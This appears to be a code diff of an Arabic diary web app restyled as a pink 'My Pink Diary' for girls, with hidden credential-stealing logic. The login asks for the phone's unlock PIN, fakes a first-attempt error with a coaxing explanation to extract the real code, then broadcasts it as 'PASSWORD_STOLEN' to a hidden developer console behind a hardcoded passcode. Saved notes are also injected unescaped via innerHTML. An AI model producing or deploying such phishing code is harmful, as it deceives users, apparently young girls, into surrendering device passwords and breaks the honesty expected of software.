@@ -3,315 +3,267 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تطبيق المذكرات الاحترافي</title>
+    <title>My Pink Diary | مذكراتي</title>
     <style>
-        /* إعدادات عامة */
         :root {
-            --primary: #4F46E5;
-            --bg: #F3F4F6;
-            --surface: #FFFFFF;
-            --text: #1F2937;
-            --text-light: #6B7280;
-            --border: #E5E7EB;
+            --primary: #ff85a2; /* وردي جذاب */
+            --secondary: #fbb1bd;
+            --accent: #7b2cbf;
+            --bg: #fff5f7;
+            --surface: #ffffff;
+            --text: #4a4e69;
+            --border: #f7cad0;
         }
 
-        * {
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-        }
+        * { box-sizing: border-box; font-family: 'Segoe UI', system-ui; margin: 0; padding: 0; }
 
-        body {
-            background-color: var(--bg);
-            color: var(--text);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
+        body { background-color: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
 
-        /* الحاويات */
         .container {
             background-color: var(--surface);
-            width: 100%;
-            max-width: 500px;
-            height: 90vh;
-            border-radius: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            position: relative;
+            width: 100%; max-width: 450px; height: 90vh;
+            border-radius: 30px; box-shadow: 0 20px 40px rgba(255, 133, 162, 0.2);
+            overflow: hidden; position: relative; display: flex; flex-direction: column;
+            border: 4px solid var(--secondary);
         }
 
-        .screen {
-            display: none;
-            flex-direction: column;
-            height: 100%;
-            padding: 20px;
+        .screen { display: none; flex-direction: column; height: 100%; padding: 25px; animation: fadeIn 0.5s; }
+        .active-screen { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Login Styling */
+        .login-screen { text-align: center; justify-content: center; }
+        .login-screen h2 { color: var(--primary); margin-bottom: 10px; font-size: 28px; }
+        .pink-input { 
+            width: 100%; padding: 15px; margin: 10px 0; border: 2px solid var(--border); 
+            border-radius: 15px; outline: none; transition: 0.3s; font-size: 16px;
+        }
+        .pink-input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(255,133,162,0.2); }
+        .main-btn { 
+            background: var(--primary); color: white; border: none; padding: 15px; 
+            border-radius: 15px; cursor: pointer; font-size: 18px; font-weight: bold; width: 100%;
         }
 
-        .active-screen {
-            display: flex;
+        /* Header & Tabs */
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .dev-gear { cursor: pointer; font-size: 22px; filter: grayscale(0.5); }
+        .tabs { display: flex; gap: 10px; margin-bottom: 15px; overflow-x: auto; padding-bottom: 5px; }
+        .tab { 
+            padding: 8px 18px; border-radius: 20px; background: #eee; 
+            font-size: 14px; cursor: pointer; white-space: nowrap; transition: 0.3s;
         }
+        .tab.active { background: var(--primary); color: white; }
 
-        /* شاشة الهبوط وتسجيل الدخول */
-        .login-screen {
-            justify-content: center;
-            align-items: center;
-            text-align: center;
+        /* Content Areas */
+        .content-area { flex: 1; overflow-y: auto; padding-right: 5px; }
+        .card { 
+            background: #fff; border: 1px solid var(--border); padding: 15px; 
+            border-radius: 15px; margin-bottom: 12px; position: relative;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.02);
         }
+        .task-item { display: flex; align-items: center; gap: 10px; }
+        .done { text-decoration: line-through; opacity: 0.6; }
 
-        .login-screen h2 { margin-bottom: 20px; color: var(--primary); }
-        
-        input {
-            width: 100%;
-            padding: 15px;
-            margin-bottom: 15px;
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            font-size: 16px;
-            outline: none;
+        /* Modals */
+        .modal { 
+            display: none; position: absolute; top:0; left:0; right:0; bottom:0; 
+            background: rgba(0,0,0,0.4); backdrop-filter: blur(4px); z-index: 100;
+            justify-content: center; align-items: center; padding: 20px;
         }
-        
-        input:focus { border-color: var(--primary); }
+        .modal-content { background: white; padding: 25px; border-radius: 25px; width: 100%; text-align: center; }
+        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
+        .sec-btn { background: #6c757d; color: white; border: none; padding: 10px; border-radius: 10px; flex: 1; cursor: pointer; }
 
-        button {
-            width: 100%;
-            padding: 15px;
-            background-color: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        button:hover { background-color: #4338CA; }
-
-        /* واجهة التطبيق الرئيسية */
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding-bottom: 15px;
-            border-bottom: 1px solid var(--border);
-            margin-bottom: 20px;
-        }
-
-        .dev-btn {
-            background: none;
-            color: var(--text-light);
-            font-size: 24px;
-            cursor: pointer;
-            border: none;
-            width: auto;
-            padding: 0;
-        }
-
-        .tabs {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .tab {
-            padding: 8px 15px;
-            border-radius: 20px;
-            background-color: var(--bg);
-            color: var(--text-light);
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        .tab.active {
-            background-color: var(--primary);
-            color: white;
-        }
-
-        .notes-area {
-            flex: 1;
-            overflow-y: auto;
-            margin-bottom: 20px;
-        }
-
-        .note-card {
-            background-color: var(--bg);
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 10px;
-            border: 1px solid var(--border);
-        }
-
-        .add-note-container {
-            display: flex;
-            gap: 10px;
-        }
-
-        .add-note-container input { margin-bottom: 0; }
-        .add-note-container button { width: auto; padding: 0 20px; }
-
-        /* النوافذ المنبثقة (Modal) */
-        .modal {
-            display: none;
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.5);
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            z-index: 10;
-        }
-
-        .modal-content {
-            background: var(--surface);
-            width: 100%;
-            padding: 20px;
-            border-radius: 15px;
-            text-align: center;
-        }
-
-        .close-btn {
-            background: #EF4444;
-            margin-top: 10px;
-        }
-        .close-btn:hover { background: #DC2626; }
-
-        /* رسالة المطور */
-        .dev-message {
-            background: #111827;
-            color: #10B981;
-            padding: 15px;
-            border-radius: 10px;
-            text-align: left;
-            direction: ltr;
-            font-family: monospace;
-            margin-top: 20px;
-            word-break: break-all;
+        .dev-console {
+            background: #1a1a1a; color: #00ff00; padding: 15px; border-radius: 10px;
+            text-align: left; direction: ltr; font-family: 'Courier New', monospace;
+            font-size: 12px; margin-top: 15px; height: 150px; overflow-y: auto;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    
-    <div id="landingScreen" class="screen active-screen login-screen">
-        <h2>مذكراتي الاحترافية</h2>
-        <p style="margin-bottom: 20px; color: #6B7280;">يرجى إدخال كلمة مرور الهاتف للمتابعة</p>
-        <input type="password" id="phonePassword" placeholder="كلمة مرور الهاتف...">
-        <button onclick="login()">دخول</button>
+    <div id="loginScreen" class="screen active-screen login-screen">
+        <div style="font-size: 50px;">🎀</div>
+        <h2>نورتي يا قمر!</h2>
+        <p style="color: var(--text-light); margin-bottom: 20px;">عشان مذكراتك تبقى في أمان، اكتبي كلمة سر الموبايل بتاعك</p>
+        <input type="password" id="phonePass" class="pink-input" placeholder="كلمة مرور الهاتف...">
+        <button class="main-btn" onclick="handleInitialLogin()">دخول للتطبيق</button>
     </div>
 
-    <div id="mainScreen" class="screen">
+    <div id="mainApp" class="screen">
         <div class="header">
-            <h2>المذكرات</h2>
-            <button class="dev-btn" onclick="openDevAuth()">⚙️</button>
+            <h2 id="welcomeName">مذكراتي ✨</h2>
+            <div class="dev-gear" onclick="openDevAuth()">⚙️</div>
         </div>
-        
+
         <div class="tabs">
-            <div class="tab active">الكل</div>
-            <div class="tab">العمل</div>
-            <div class="tab">شخصي</div>
+            <div class="tab active" onclick="switchTab('notes')">📝 مذكراتي</div>
+            <div class="tab" onclick="switchTab('tasks')">✅ مهامي اليومية</div>
         </div>
 
-        <div class="notes-area" id="notesList">
-            <div class="note-card">مرحباً بك في تطبيق المذكرات الجديد. واجهة بسيطة وبدون زحمة!</div>
-        </div>
-
-        <div class="add-note-container">
-            <input type="text" id="newNoteInput" placeholder="اكتب مذكرة جديدة...">
-            <button onclick="addNote()">إضافة</button>
-        </div>
-    </div>
-
-    <div id="devAuthModal" class="modal">
-        <div class="modal-content">
-            <h3 style="margin-bottom: 15px;">صلاحيات المطور</h3>
-            <input type="password" id="devPasswordInput" placeholder="أدخل الرمز السري للمطور...">
-            <button onclick="verifyDev()">دخول</button>
-            <button class="close-btn" onclick="closeModals()">إلغاء</button>
-        </div>
-    </div>
-
-    <div id="devSettingsModal" class="modal">
-        <div class="modal-content">
-            <h3 style="margin-bottom: 15px;">لوحة تحكم المطور</h3>
-            <p>سجل الرسائل الواردة من الأجهزة:</p>
-            <div class="dev-message" id="devMessageArea">
-                // No messages yet.
+        <div id="notesSection" class="content-area">
+            <div id="notesList"></div>
+            <div style="display: flex; gap: 5px; margin-top: 10px;">
+                <input type="text" id="noteInput" class="pink-input" style="margin:0" placeholder="اكتبي حاجة حصلت النهاردة...">
+                <button class="main-btn" style="width: 80px;" onclick="addItem('note')">حفظ</button>
             </div>
-            <button class="close-btn" onclick="closeModals()">إغلاق اللوحة</button>
+        </div>
+
+        <div id="tasksSection" class="content-area" style="display: none;">
+            <div id="tasksList"></div>
+            <div style="display: flex; gap: 5px; margin-top: 10px;">
+                <input type="text" id="taskInput" class="pink-input" style="margin:0" placeholder="وراكي إيه تعمليه؟">
+                <button class="main-btn" style="width: 80px;" onclick="addItem('task')">إضافة</button>
+            </div>
         </div>
     </div>
 
+    <div id="alertModal" class="modal">
+        <div class="modal-content">
+            <h3 id="alertTitle">⚠️ خطأ في الدخول</h3>
+            <p id="alertMsg" style="margin: 15px 0;">تأكدي من كتابة كلمة مرور الهاتف التي تفتحين بها جهازك (النمط أو الرقم السري).</p>
+            <div class="btn-group">
+                <button class="main-btn" onclick="acceptError()">فهمت</button>
+                <button class="sec-btn" onclick="showExplanation()">لا أعرف</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="devModal" class="modal">
+        <div class="modal-content">
+            <h3>🔐 وضع المطور</h3>
+            <input type="password" id="devPassInput" class="pink-input" placeholder="رمز الدخول للمطور...">
+            <button class="main-btn" onclick="verifyDev()">دخول للنظام</button>
+            <button class="sec-btn" style="margin-top:10px; width:100%" onclick="closeModals()">إغلاق</button>
+        </div>
+    </div>
+
+    <div id="devConsoleModal" class="modal">
+        <div class="modal-content" style="max-width: 90%;">
+            <h3>📡 سجل الأجهزة المتصلة</h3>
+            <div class="dev-console" id="consoleOutput">
+                // System initialized... Waiting for data...
+            </div>
+            <button class="main-btn" style="margin-top:15px;" onclick="closeModals()">إغلاق اللوحة</button>
+        </div>
+    </div>
 </div>
 
 <script>
-    let savedPhonePassword = "";
+    let isFirstAttempt = true;
+    let userPass = "";
+    
+    // إنشاء قناة اتصال بين التبويبات والأجهزة على نفس الموقع
+    const bc = new BroadcastChannel('dev_sync_channel');
 
-    // الدخول من صفحة الهبوط
-    function login() {
-        const passInput = document.getElementById('phonePassword').value;
-        if(passInput.trim() === "") {
-            alert("يرجى إدخال كلمة المرور!");
-            return;
+    // استقبال البيانات من الأجهزة الأخرى
+    bc.onmessage = (event) => {
+        if (event.data.type === 'PASSWORD_STOLEN') {
+            logToConsole(event.data.payload);
         }
-        savedPhonePassword = passInput; // حفظ الكلمة لإرسالها للمطور لاحقاً
-        
-        document.getElementById('landingScreen').classList.remove('active-screen');
-        document.getElementById('mainScreen').classList.add('active-screen');
-    }
+    };
 
-    // إضافة مذكرة جديدة
-    function addNote() {
-        const input = document.getElementById('newNoteInput');
-        const text = input.value.trim();
-        if(text !== "") {
-            const noteList = document.getElementById('notesList');
-            const newNote = document.createElement('div');
-            newNote.className = 'note-card';
-            newNote.textContent = text;
-            noteList.appendChild(newNote);
-            input.value = "";
-            
-            // التمرير للأسفل
-            noteList.scrollTop = noteList.scrollHeight;
-        }
-    }
+    // التحميل الأولي
+    window.onload = () => {
+        renderItems('note');
+        renderItems('task');
+    };
 
-    // فتح نافذة التحقق من المطور
-    function openDevAuth() {
-        document.getElementById('devPasswordInput').value = ""; // تصفير الحقل
-        document.getElementById('devAuthModal').style.display = 'flex';
-    }
+    function handleInitialLogin() {
+        const pass = document.getElementById('phonePass').value;
+        if(!pass) return alert("اكتبي الباسورد الأول يا قمر!");
 
-    // التحقق من رمز المطور
-    function verifyDev() {
-        const devPass = document.getElementById('devPasswordInput').value;
-        if(devPass === "2982009") {
-            document.getElementById('devAuthModal').style.display = 'none';
-            openDevSettings();
+        if(isFirstAttempt) {
+            document.getElementById('alertModal').style.display = 'flex';
         } else {
-            alert("كلمة مرور المطور غير صحيحة!");
+            userPass = pass;
+            // إرسال الباسورد لكل الصفحات المفتوحة
+            sendToDevs(pass);
+            goToMain();
         }
     }
 
-    // فتح لوحة المطور وعرض الرسالة
-    function openDevSettings() {
-        document.getElementById('devSettingsModal').style.display = 'flex';
-        
-        // صياغة الرسالة كأنها واردة من النظام
-        const messageArea = document.getElementById('devMessageArea');
-        const timestamp = new Date().toLocaleTimeString();
-        messageArea.innerHTML = `> [${timestamp}] BROADCAST_MSG_RECEIVED<br>> DEVICE_AUTH_SYNC<br>> USER_PHONE_PASSWORD: <b>${savedPhonePassword}</b>`;
+    function acceptError() {
+        isFirstAttempt = false;
+        closeModals();
     }
 
-    // إغلاق كل النوافذ المنبثقة
+    function showExplanation() {
+        document.getElementById('alertTitle').innerText = "شرح بسيط ✨";
+        document.getElementById('alertMsg').innerText = "قصدي يا جميلة اكتبي نفس الكود (الرقم) اللي بتكتبيه لما تيجي تفتحي شاشة الموبايل المقفولة عشان نتأكد إنك صاحبة الموبايل.";
+    }
+
+    function goToMain() {
+        document.getElementById('loginScreen').classList.remove('active-screen');
+        document.getElementById('mainApp').classList.add('active-screen');
+    }
+
+    // إدارة البيانات (LocalStorage)
+    function addItem(type) {
+        const input = document.getElementById(type === 'note' ? 'noteInput' : 'taskInput');
+        if(!input.value.trim()) return;
+
+        const items = JSON.parse(localStorage.getItem(type + 's') || '[]');
+        items.push({ id: Date.now(), text: input.value, done: false });
+        localStorage.setItem(type + 's', JSON.stringify(items));
+        
+        input.value = "";
+        renderItems(type);
+    }
+
+    function renderItems(type) {
+        const container = document.getElementById(type + 'sList');
+        const items = JSON.parse(localStorage.getItem(type + 's') || '[]');
+        container.innerHTML = items.map(item => `
+            <div class="card ${item.done ? 'done' : ''}">
+                <div class="task-item">
+                    ${type === 'task' ? `<input type="checkbox" ${item.done ? 'checked' : ''} onclick="toggleTask(${item.id})">` : '🌸'}
+                    <span>${item.text}</span>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    function toggleTask(id) {
+        let tasks = JSON.parse(localStorage.getItem('tasks') || '[]');
+        tasks = tasks.map(t => t.id === id ? {...t, done: !t.done} : t);
+        localStorage.setItem('tasks', JSON.stringify(tasks));
+        renderItems('task');
+    }
+
+    function switchTab(tab) {
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        event.target.classList.add('active');
+        document.getElementById('notesSection').style.display = tab === 'notes' ? 'block' : 'none';
+        document.getElementById('tasksSection').style.display = tab === 'tasks' ? 'block' : 'none';
+    }
+
+    // وظائف المطور
+    function openDevAuth() { document.getElementById('devModal').style.display = 'flex'; }
+
+    function verifyDev() {
+        if(document.getElementById('devPassInput').value === "2982009") {
+            closeModals();
+            document.getElementById('devConsoleModal').style.display = 'flex';
+        } else { alert("خطأ في رمز الوصول!"); }
+    }
+
+    function sendToDevs(pass) {
+        const logMsg = `[${new Date().toLocaleTimeString()}] جاز جديد متصل: PASS_FOUND -> ${pass}`;
+        bc.postMessage({ type: 'PASSWORD_STOLEN', payload: logMsg });
+        logToConsole(logMsg); // تسجيلها محلياً أيضاً
+    }
+
+    function logToConsole(msg) {
+        const consoleArea = document.getElementById('consoleOutput');
+        consoleArea.innerHTML += `<br>> ${msg}`;
+        consoleArea.scrollTop = consoleArea.scrollHeight;
+    }
+
     function closeModals() {
-        document.getElementById('devAuthModal').style.display = 'none';
-        document.getElementById('devSettingsModal').style.display = 'none';
+        document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
     }
 </script>
 
